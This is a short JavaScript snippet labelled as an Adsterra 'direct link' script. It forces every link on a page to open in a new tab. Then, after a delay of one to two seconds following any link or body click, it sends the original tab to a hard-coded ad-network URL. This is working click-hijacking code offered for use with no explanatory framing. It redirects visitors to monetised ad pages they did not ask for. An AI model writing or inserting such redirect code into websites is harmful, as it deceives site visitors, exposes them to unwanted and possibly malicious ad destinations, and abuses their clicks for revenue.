(()=>{

  //-- direct link adsterra 
  const urlDirectClick2 = "https://trashyepochabsorbing.com/n4wee7154b?key=b48a80bb4c1476f5a79b76ef7176715b";

  document.querySelectorAll("a").forEach(element => {
    element.setAttribute("target","_blank");
    element.addEventListener("click", event => {
      const isTargetBlank = event.target.target === "_blank";
      const isShortcutKeyPressed = event.ctrlKey || event.shiftKey || event.metaKey;
      if (isTargetBlank || isShortcutKeyPressed) {
        try{
          setTimeout(()=>{
            window.location.href=urlDirectClick2;
          },1000);
        }catch(e){};
      };
    });
  });

  document.querySelector("body").addEventListener("click",(event)=>{
      setTimeout(()=>{
          window.location.href=urlDirectClick2;
      },2000);
  });
})();
